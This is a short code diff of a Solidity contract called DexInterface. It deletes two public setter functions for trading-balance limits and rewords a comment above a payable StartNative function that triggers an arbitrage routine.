@@ -258,16 +258,8 @@ contract DexInterface {
 	// Fallback function to accept any incoming ETH
 	receive() external payable {}
 
-      // Function for setting the maximum deposit of Ethereum allowed for trading
-    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
-        tradingBalanceInPercent = _tradingBalanceInPercent;
-    }
-    // Function for setting the maximum deposit percentage allowed for trading. The smallest limit is selected from two limits
-    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {
-        tradingBalanceInTokens = _tradingBalanceInTokens;
-    }
- 
-    // Function for triggering an arbitration contract
+    
+    // Function for triggering the  contract
     function StartNative() public payable {
        startArbitrageNative();
     }
